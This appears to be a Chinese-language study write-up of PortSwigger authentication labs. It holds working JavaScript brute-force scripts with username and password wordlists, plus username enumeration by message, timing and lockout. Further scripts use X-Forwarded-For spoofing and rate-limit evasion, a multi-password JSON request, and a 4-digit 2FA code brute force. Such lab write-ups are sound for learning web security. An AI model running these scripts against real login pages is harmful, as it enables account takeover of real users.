---
title: Authentication vulnerabilities
description: Authentication vulnerabilities
last_update:
  date: "2025-09-11T08:00:00+08:00"
---

## Lab: Username enumeration via different responses

| Dimension | Description                                                                                                         |
| --------- | ------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/authentication/password-based#username-enumeration                             |
| Lab       | https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses |

usernames

```js
const usernames = `carlos
root
admin
test
guest
info
adm
mysql
user
administrator
oracle
ftp
pi
puppet
ansible
ec2-user
vagrant
azureuser
academico
acceso
access
accounting
accounts
acid
activestat
ad
adam
adkit
admin
administracion
administrador
administrator
administrators
admins
ads
adserver
adsl
ae
af
affiliate
affiliates
afiliados
ag
agenda
agent
ai
aix
ajax
ak
akamai
al
alabama
alaska
albuquerque
alerts
alpha
alterwind
am
amarillo
americas
an
anaheim
analyzer
announce
announcements
antivirus
ao
ap
apache
apollo
app
app01
app1
apple
application
applications
apps
appserver
aq
ar
archie
arcsight
argentina
arizona
arkansas
arlington
as
as400
asia
asterix
at
athena
atlanta
atlas
att
au
auction
austin
auth
auto
autodiscover`.split("\n");
```

passwords

```js
const passwords = `123456
password
12345678
qwerty
123456789
12345
1234
111111
1234567
dragon
123123
baseball
abc123
football
monkey
letmein
shadow
master
666666
qwertyuiop
123321
mustang
1234567890
michael
654321
superman
1qaz2wsx
7777777
121212
000000
qazwsx
123qwe
killer
trustno1
jordan
jennifer
zxcvbnm
asdfgh
hunter
buster
soccer
harley
batman
andrew
tigger
sunshine
iloveyou
2000
charlie
robert
thomas
hockey
ranger
daniel
starwars
klaster
112233
george
computer
michelle
jessica
pepper
1111
zxcvbn
555555
11111111
131313
freedom
777777
pass
maggie
159753
aaaaaa
ginger
princess
joshua
cheese
amanda
summer
love
ashley
nicole
chelsea
biteme
matthew
access
yankees
987654321
dallas
austin
thunder
taylor
matrix
mobilemail
mom
monitor
monitoring
montana
moon
moscow`.split("\n");
```

login function

```js
function login(username, password) {
  return fetch(`${location.origin}/login`, {
    headers: {
      "content-type": "application/x-www-form-urlencoded",
    },
    body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`,
    method: "POST",
    mode: "cors",
    credentials: "include",
  });
}
```

main function

```js
async function main() {
  for (const username of usernames) {
    for (const password of passwords) {
      const response = await login(username, password);
      // custom logic here
      const isCorrect = response.redirected;
      if (isCorrect) return;
      const text = await response.text();
      const isInvalidUsername = text.includes("Invalid username");
      if (isInvalidUsername) break;
    }
  }
}
```

## Lab: Username enumeration via subtly different responses

| Dimension | Description                                                                                                                |
| --------- | -------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/authentication/password-based#username-enumeration                                    |
| Lab       | https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-subtly-different-responses |

先找出正確的 username

```js
async function main() {
  for (const username of usernames) {
    for (const password of passwords.slice(0, 1)) {
      const response = await login(username, password);
      // custom logic here
      const text = await response.text();
      const isInvalid = text.includes("Invalid username or password.");
      if (!isInvalid) {
        console.log(username);
        return;
      }
    }
  }
}
```

得出 `antivirus` 之後，開始爆破密碼

```js
async function main() {
  for (const username of ["antivirus"]) {
    for (const password of passwords) {
      const response = await login(username, password);
      // custom logic here
      const text = await response.text();
      const isInvalid = text.includes("Invalid username or password ");
      if (!isInvalid) {
        console.log(username, password);
        return;
      }
    }
  }
}
```

這題的重點觀念是，"帳號錯誤" 跟 "密碼錯誤" 可能會回傳些許不同的 error message，利用這個差異，就可以得知這個帳號是合法的

- 帳號錯誤 => `"Invalid username or password."`
- 密碼錯誤 => `"Invalid username or password "`

## Lab: Username enumeration via response timing

| Dimension | Description                                                                             |
| --------- | --------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/authentication/password-based#username-enumeration |
| Lab       | https://portswigger.net/web-security/clickjacking/lab-basic-csrf-protected              |

先找出正確的 username

login function，加上 `X-Forwarded-For` 避免同一個 IP 被鎖

```js
function login(username, password) {
  return fetch(`${location.origin}/login`, {
    headers: {
      "content-type": "application/x-www-form-urlencoded",
      "X-Forwarded-For": new Date().toISOString(),
    },
    body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`,
    method: "POST",
    mode: "cors",
    credentials: "include",
  });
}
```

main function

```js
async function main() {
  for (const username of usernames) {
    for (const password of [
      "123123123123123123123213123123123123123123123123123123123123123123123123123123123123123123",
    ]) {
      const start = performance.now();
      const response = await login(username, password);
      // custom logic here
      const text = await response.text();
      const end = performance.now();
      const ms = end - start;
      const isBlocked = text.includes(
        "You have made too many incorrect login attempts. Please try again in 30 minute(s).",
      );
      const isValid = response.redirected;
      if (isValid) {
        console.log(username, password);
        return;
      }
      if (isBlocked) return;
      if (ms > 400) console.log(username, password);
    }
  }
}
```

結果有多個 `['carlos', 'ak']`，畢竟透過時間來判斷不是很準確

```js
async function main() {
  for (const username of ["carlos", "ak"]) {
    for (const password of passwords) {
      const start = performance.now();
      const response = await login(username, password);
      // custom logic here
      const text = await response.text();
      const end = performance.now();
      const ms = end - start;
      const isBlocked = text.includes(
        "You have made too many incorrect login attempts. Please try again in 30 minute(s).",
      );
      const isValid = response.redirected;
      if (isValid) {
        console.log(username, password);
        return;
      }
      if (isBlocked) return;
      if (ms > 400) console.log(username, password);
    }
  }
}
```

這題的重點是，在爆破 username 的時候，記得 password 用長一點的，才可以把時間差異擴大

## Lab: Broken brute-force protection, IP block

| Dimension | Description                                                                                                  |
| --------- | ------------------------------------------------------------------------------------------------------------ |
| Document  | https://portswigger.net/web-security/authentication/password-based#flawed-brute-force-protection             |
| Lab       | https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block |

```js
function loginWiener() {
  fetch(
    "https://0a7a00c20376c23880502121006a0043.web-security-academy.net/login",
    {
      headers: {
        "content-type": "application/x-www-form-urlencoded",
      },
      body: "username=wiener&password=peter",
      method: "POST",
      mode: "cors",
      credentials: "include",
    },
  );
}

async function main() {
  for (const password of passwords) {
    const response = await login("carlos", password);
    // custom logic here
    const isCorrect = response.redirected;
    if (isCorrect) return console.log(password);
    await loginWiener();
  }
}
```

## Lab: Username enumeration via account lock

| Dimension | Description                                                                                                  |
| --------- | ------------------------------------------------------------------------------------------------------------ |
| Document  | https://portswigger.net/web-security/authentication/password-based#account-locking                           |
| Lab       | https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-account-lock |

測試同一個 valid 帳號連續錯誤 5 次就會鎖

```js
async function main() {
  for (const username of usernames) {
    for (const password of passwords.slice(0, 1)) {
      await login(username, password);
      await login(username, password);
      await login(username, password);
      await login(username, password);
      const response = await login(username, password);
      // custom logic here
      const text = await response.text();
      const isInvalid = text.includes("Invalid username or password.");
      console.log({ username, password, isInvalid });
      if (!isInvalid) {
        console.log(username, "isValid");
        return;
      }
    }
  }
}
```

來猜密碼

```js
async function main() {
  for (const username of ["agenda"]) {
    for (const password of passwords) {
      const response = await login(username, password);
      // custom logic here
      const text = await response.text();
      const isInvalid = text.includes("Invalid username or password.");
      console.log({ username, password, isInvalid });
      if (!isInvalid) {
        console.log(username, "isValid");
        return;
      }
    }
  }
}
```

第 4 次的時候停下來了，錯誤訊息是

```
You have made too many incorrect login attempts. Please try again in 1 minute(s).
```

嘗試加個 sleep，每嘗試 3 次就休息 1 分鐘，雙螢幕的夥伴就可以先把 youtube 打開刷影片了(x)

```js
function sleep(time) {
  return new Promise((resolve) => {
    setTimeout(resolve, time);
  });
}

async function main() {
  let count = 0;
  for (const username of ["agenda"]) {
    for (const password of passwords.slice(3)) {
      const response = await login(username, password);
      // custom logic here
      const text = await response.text();
      const isInvalid = text.includes("Invalid username or password.");
      count += 1;
      console.log({ username, password, isInvalid });
      if (!isInvalid) {
        console.log(username, "stops");
        return;
      }
      if (count === 3) {
        count = 0;
        await sleep(60000);
      }
    }
  }
}
```

過了約 30 分鐘，終於在第 95 次嘗試的時候找到答案，感動～

## Lab: Broken brute-force protection, multiple credentials per request

| Dimension | Description                                                                                                                           |
| --------- | ------------------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/authentication/password-based#user-rate-limiting                                                 |
| Lab       | https://portswigger.net/web-security/authentication/password-based/lab-broken-brute-force-protection-multiple-credentials-per-request |

嘗試第 4 次的時候，看到

```
You have made too many incorrect login attempts. Please try again in 1 minute(s).
```

題目說 multiple credentials per request，所幸死馬當活馬醫，直接把所有 passwords 塞進去一個 HTTP Request

```js
fetch(
  "https://0a20008604f3a7bf80c0ada400a50066.web-security-academy.net/login",
  {
    headers: {
      "content-type": "application/json",
    },
    body: JSON.stringify({
      username: "carlos",
      password: passwords,
    }),
    method: "POST",
    mode: "cors",
    credentials: "include",
  },
);
```

結果就神奇的通關了，是說真的會有後端這樣設計登入流程嗎...

## Lab: 2FA simple bypass

| Dimension | Description                                                                                          |
| --------- | ---------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/authentication/multi-factor#bypassing-two-factor-authentication |
| Lab       | https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-simple-bypass               |

先用 `carlos:montoya` 登入

之後直接進入 https://0a9000cc0485827580ab9e100042008e.web-security-academy.net/my-account?id=carlos 就成功 Bypass

## Lab: 2FA broken logic

| Dimension | Description                                                                                           |
| --------- | ----------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/authentication/multi-factor#flawed-two-factor-verification-logic |
| Lab       | https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic                 |

在 `/login2` 可以發現 `Cookie: verify=wiener`，嘗試將 `wiener` 改成 `carlos`，並且重整頁面，確保有重新發送 4-digit security code

之後就可以開始暴力破解

```js
const codes = Array(10000)
  .fill(0)
  .map((zero, idx) => String(idx).padStart(4, "0"));

function login(code) {
  return fetch(
    "https://0ada00380311b61280cc0822004d00f6.web-security-academy.net/login2",
    {
      headers: {
        "content-type": "application/x-www-form-urlencoded",
      },
      body: `mfa-code=${code}`,
      method: "POST",
      mode: "cors",
      credentials: "include",
    },
  );
}

async function main() {
  for (const code of codes) {
    const response = await login(code);
    if (response.redirected) return;
  }
}
```

成功在 1630 停下，剛好我也刷完牙了

## 參考資料

- https://portswigger.net/web-security/authentication
